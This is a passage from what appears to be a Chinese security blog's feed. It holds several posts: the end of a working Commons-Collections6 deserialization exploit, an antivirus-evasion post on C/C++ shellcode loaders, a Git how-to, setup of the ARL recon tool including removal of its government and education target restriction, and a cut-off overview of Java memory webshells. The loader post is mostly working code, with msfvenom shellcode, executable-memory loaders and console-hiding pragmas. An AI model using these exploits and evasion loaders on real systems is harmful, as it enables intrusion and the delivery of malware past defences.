class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;key&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化hashMap</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(map);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化hashMap</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/image/article/Java%E5%88%A9%E7%94%A8%E9%93%BECommonCollections6%E5%88%86%E6%9E%90.assets/image-20240120231051698.png" alt="image-20240120231051698"></p>]]></content>
    
    
    <summary type="html">Java利用链CommonCollections6分析</summary>
    
    
    
    <category term="代码审计" scheme="http://example.com/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="Java代码审计" scheme="http://example.com/tag/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>C/C++的常见shellcode加载器</title>
    <link href="http://example.com/posts/1204349823.html"/>
    <id>http://example.com/posts/1204349823.html</id>
    <published>2024-01-18T09:53:16.000Z</published>
    <updated>2024-03-03T14:43:23.036Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C-C-的常见shellcode加载器"><a href="#C-C-的常见shellcode加载器" class="headerlink" title="C&#x2F;C++的常见shellcode加载器"></a>C&#x2F;C++的常见shellcode加载器</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>准备一段弹出计算器的shellcode，利用msfvenom生成</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=calc.exe -f c -o calc_shellcode.txt</span><br></pre></td></tr></table></figure><p> 内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat calc_shellcode.txt</span></span><br><span class="line">unsigned char buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span></span><br><span class="line"><span class="string">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="加载方式"><a href="#加载方式" class="headerlink" title="加载方式"></a>加载方式</h2><p>以下是常见实用的shellcode加载方式，除此之外还有一些</p><p>内嵌汇编__asm{..}只支持x86</p><p>汇编花指令太老没什么用</p><h3 id="指针执行-强制类型转换"><a href="#指针执行-强制类型转换" class="headerlink" title="指针执行&#x2F;强制类型转换"></a>指针执行&#x2F;强制类型转换</h3><p>必须增加节属性shellcode才能正常加载</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br></pre></td></tr></table></figure><p>或者</p><p><img src="/image/article/C-C-%E7%9A%84%E5%B8%B8%E8%A7%81shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8.assets/image-20240118231232098.png" alt="image-20240118231232098"></p><p>去除dos黑窗口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span></span><br><span class="line"><span class="string">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span></span><br><span class="line"><span class="string">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">((<span class="built_in">void</span>(*)(<span class="type">void</span>)) &amp; buf)();</span><br><span class="line">    <span class="comment">//or 强制类型转换</span></span><br><span class="line">    <span class="comment">//((void(WINAPI*)(void))&amp;buf)();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="申请动态内存"><a href="#申请动态内存" class="headerlink" title="申请动态内存"></a>申请动态内存</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> shellcode[] = </span><br><span class="line">        <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span></span><br><span class="line">        <span class="string">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span></span><br><span class="line">        <span class="string">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span></span><br><span class="line">        <span class="string">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span></span><br><span class="line">        <span class="string">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span></span><br><span class="line">        <span class="string">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span></span><br><span class="line">        <span class="string">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span></span><br><span class="line">        <span class="string">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span></span><br><span class="line">        <span class="string">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span></span><br><span class="line">        <span class="string">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb&quot;</span></span><br><span class="line">        <span class="string">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, shellcode, <span class="keyword">sizeof</span> shellcode);</span><br><span class="line">    </span><br><span class="line">    ((<span class="built_in">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">C/C++的常见shellcode加载器</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Git代码提交与Vscode工具管理</title>
    <link href="http://example.com/posts/217580055.html"/>
    <id>http://example.com/posts/217580055.html</id>
    <published>2024-01-18T01:56:24.000Z</published>
    <updated>2024-03-03T14:42:25.258Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Git代码提交与Vscode工具管理"><a href="#Git代码提交与Vscode工具管理" class="headerlink" title="Git代码提交与Vscode工具管理"></a>Git代码提交与Vscode工具管理</h1><h2 id="远程拉取代码到本地"><a href="#远程拉取代码到本地" class="headerlink" title="远程拉取代码到本地"></a>远程拉取代码到本地</h2><p>1.新建文件夹xxx</p><p>2.初始化项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>3.与远程分支建立关联</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:xxx/xxx.git</span><br></pre></td></tr></table></figure><p>4.拉取远程分支到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fetch origin dev</span><br></pre></td></tr></table></figure><p>5.创建本地分支并关联到远程分支</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev(本地分支名) origin/dev(远程分支名)</span><br></pre></td></tr></table></figure><p><code>git branch</code> 查看本地分支<br><code>git branch -a</code> 查看当前所在分支及远程分支<br><code>git branch -r</code> 查看远程分支<br><code>git branch -vv</code> 查看本地分支与远程分支的关联关系</p>]]></content>
    
    
    <summary type="html">Git代码提交与Vscode工具管理</summary>
    
    
    
    <category term="其他" scheme="http://example.com/category/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ARL资产侦察系统使用</title>
    <link href="http://example.com/posts/4165132246.html"/>
    <id>http://example.com/posts/4165132246.html</id>
    <published>2024-01-17T02:15:18.000Z</published>
    <updated>2024-03-03T14:43:16.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ARL资产侦察系统使用"><a href="#ARL资产侦察系统使用" class="headerlink" title="ARL资产侦察系统使用"></a>ARL资产侦察系统使用</h1><h2 id="官方DOC"><a href="#官方DOC" class="headerlink" title="官方DOC"></a>官方DOC</h2><p><a href="https://tophanttechnology.github.io/ARL-doc/">https://tophanttechnology.github.io/ARL-doc/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>参考官网docker compose的安装方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/</span><br><span class="line">mkdir docker_arl</span><br><span class="line">wget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.6.1/docker.zip</span><br><span class="line">cd docker_arl</span><br><span class="line">unzip -o docker.zip</span><br><span class="line">docker volume create arl_db</span><br><span class="line">docker-compose pull</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="ARL功能增强配置"><a href="#ARL功能增强配置" class="headerlink" title="ARL功能增强配置"></a>ARL功能增强配置</h2><h3 id="GOV-EDU-ORG解除限制"><a href="#GOV-EDU-ORG解除限制" class="headerlink" title="GOV EDU ORG解除限制"></a>GOV EDU ORG解除限制</h3><p>config-docker.yaml</p><p>修改前：</p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117104351368.png" alt="image-20240117104351368"></p><p>修改后：</p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117104649977.png" alt="image-20240117104649977"></p><h3 id="添加CMS指纹"><a href="#添加CMS指纹" class="headerlink" title="添加CMS指纹"></a>添加CMS指纹</h3><p>找到Ehole项目最新的finger.json</p><p><a href="https://github.com/EdgeSecurityTeam/EHole/blob/main/finger.json">https://github.com/EdgeSecurityTeam/EHole/blob/main/finger.json</a></p><p>用大佬写好的脚本</p><p><a href="https://github.com/loecho-sec/ARL-Finger-ADD/blob/main/ARL-Finger-ADD.py">https://github.com/loecho-sec/ARL-Finger-ADD/blob/main/ARL-Finger-ADD.py</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ARL-Finger-ADD.py http://192.168.31.98:5003/ admin pwd</span><br></pre></td></tr></table></figure><p>成功添加</p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117112501888.png" alt="image-20240117112501888"></p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117112618871.png" alt="image-20240117112618871"></p><h2 id="BUG解决"><a href="#BUG解决" class="headerlink" title="BUG解决"></a>BUG解决</h2><h3 id="在kali安装出现timeout-of-12000ms-exceeded报错"><a href="#在kali安装出现timeout-of-12000ms-exceeded报错" class="headerlink" title="在kali安装出现timeout of 12000ms exceeded报错"></a>在kali安装出现timeout of 12000ms exceeded报错</h3><p>需要把443端口改为80</p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117102342865.png" alt="image-20240117102342865"></p><p>在config-docker.yaml文件中新增</p><p><img src="/image/article/ARL%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E4%BD%BF%E7%94%A8.assets/image-20240117103311679.png" alt="image-20240117103311679"></p>]]></content>
    
    
    <summary type="html">ARL资产侦察系统使用</summary>
    
    
    
    <category term="Web安全" scheme="http://example.com/category/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>Java内存马的研究与分析（一）</title>
    <link href="http://example.com/posts/3980978188.html"/>
    <id>http://example.com/posts/3980978188.html</id>
    <published>2024-01-09T14:39:01.000Z</published>
    <updated>2024-03-03T14:42:14.512Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java内存马的研究与分析（一）"><a href="#Java内存马的研究与分析（一）" class="headerlink" title="Java内存马的研究与分析（一）"></a>Java内存马的研究与分析（一）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在实战中像SpringBoot无法解析Jsp需要有Jsp的相关依赖才能解析，还有遇到有目录监控Jsp无法落地的情况。因此参考学习了网上数十篇优秀文章进行总结与复现。</p><h2 id="Java内存马的概念"><a href="#Java内存马的概念" class="headerlink" title="Java内存马的概念"></a>Java内存马的概念</h2><p>Java内存马（Java Memory Shell）利用JVM中内存对象和反射技术来执行恶意代码段</p><h2 id="Java内存马的分类"><a href="#Java内存马的分类" class="headerlink" title="Java内存马的分类"></a>Java内存马的分类</h2><h3 id="传统Web应用型内存马"><a href="#传统Web应用型内存马" class="headerlink" title="传统Web应用型内存马"></a>传统Web应用型内存马</h3><p>使用基本 Servlet-API 实现的动态注册内存马，此种类型的内存马最经典，已经被扩展至适应各个中间件。</p><p><code>Servlet型内存马</code>：动态注册Servlet及映射路由</p><p><code>Filter型内存马</code>：动态注册Filter及映射路由</p><p><code>Listener型内存马</code>：动态注册Listener</p><blockquote><p>JavaWeb应用将Servlet与其映射、处理类&#x2F;Filter与其映射、处理类&#x2F;Listener与其处理类存放在Context中，并在程序运行时进行查找和匹配。传统Web应用型内存马就是内存的处理代码与指定的映射动态的添加在Context中的关键位置中，使程序处理一个在本地代码、配置文件中不存在的恶意逻辑</p></blockquote><h3 id="框架型内存马"><a href="#框架型内存马" class="headerlink" title="框架型内存马"></a>框架型内存马</h3><p>除了传统的 Servlet 项目，使用 Spring 全家桶进行开发的项目越来越多，而 Spring-MVC 则是自实现了相关路由注册查找逻辑，以及使用拦截器来进行过滤，思想上与 Servlet-Filter 的设计类似。</p><p><code>SpringController型内存马</code>：动态注册Controller及映射路由</p><p><code>Spring Interceptor型内存马</code>：动态注册Interceptor及映射路由</p><p><code>Spring Webflux型内存马</code>：动态注册WebFilter及映射路由</p><blockquote><p>Spring MVC使用Controller来接收用户的输入和封装Service，虽然有一部分开发习惯用Mapping来处理，但是这里通常代表处理一个用户请求的“端点“，类似于Servlet，而Interceptor拦截器则类似于Filter</p><p>Spring WebFlux是Spring Framework5.0中引入的新的响应式web框架，它不依赖Servlet-API，但是同样必须要有Filter的这种思想，实际上就是WebFilter</p></blockquote><h3 id="中间件型内存马"><a href="#中间件型内存马" class="headerlink" title="中间件型内存马"></a>中间件型内存马</h3><p>在中间件的很多功能实现上，因为采用了类似 Filter-FilterChain 的职责链模式，可以被用来做内存马，由于行业对 Tomcat 的研究较多，因此大多数的技术实现和探究是针对 Tomcat 的，但其他中间件也有相当多的探究空间。</p><p>对于各种中间件&#x2F;框架，利用其设计模式，可挖掘出多种内存马的利用方式</p><p><code>Tomcat Valve型内存马</code>：动态注册Valve</p><p><code>Tomcat Upgrade型内存马</code>：动态注册UpgradeProtocol</p><p><code>Tomcat Executor型内存马</code>：动态替换全局Executor</p><p><code>Tomcat Poller型内存马</code>：动态替换全局Poller</p><p><code>Grizzly Filter型内存马</code>：动态注册Grizzly Filter及映射路由</p><blockquote><p>中间件的很多设计都是“流式”、“管道式”，一般称之为责任链模式，每个关键点都会将Request处理，并传递给下一个处理者。在这种模式下，攻击者可以向责任链中添加自己的恶意逻辑，实现内存马的驻留</p></blockquote><h3 id="其他内存马"><a href="#其他内存马" class="headerlink" title="其他内存马"></a>其他内存马</h3><p>还有一些其他非常规的利用思路，可以用在内存马的实现上，例如 WebSocket 协议等。</p><p>除了基于 Web 协议的内存马，可以使用各种协议作为内存马的通信途径，如 grpc、jmx、jpda 等，或封装多层协议</p><p><code>WebSocket型内存马</code>：动态注册Websocket路由及处理逻辑</p><p><code>Tomcat JSP型内存马</code>：动态注册Tomcat JSP管理逻辑并实现驻留</p><p><code>线程型内存马</code>：动态添加一个无法杀死的线程</p><p><code>RMI型内存马</code>：动态启动一个RMI Registry</p><blockquote><p>对于WebSocket协议请求、JSP请求的处理，各个中间件包含自己的逻辑，这些逻辑的具体实现也可以用来作为内存马的逻辑处理</p><p>线程型内存马在系统中启动一个永不停止的线程，此时关键类无法被GC，会一直存在的目标系统中，执行事先预定义的逻辑。而RMI内存马启动一个RMI Registry并绑定恶意类作为后门</p></blockquote><h3 id="Agent型内存马"><a href="#Agent型内存马" class="headerlink" title="Agent型内存马"></a>Agent型内存马</h3><p>利用 Java Agent 技术进行植入内存马逻辑的实现方式</p><p>对于 Agent 型内存马，可以 hook 非常多的位置，如各种 SPI 的实现，可以接管整个 